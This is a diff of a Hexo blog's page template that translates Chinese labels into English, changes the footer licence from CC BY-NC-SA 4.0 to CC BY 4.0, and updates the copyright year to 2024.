@@ -517,7 +342,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-05-30T06:30:38.697Z" itemprop="dateUpdated">2022-05-30 14:30:38</time>
+    Last updated: <time datetime="2022-05-30T06:30:38.697Z" itemprop="dateUpdated">2022-05-30 14:30:38</time>
 </span><br>
 
 
@@ -684,11 +509,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
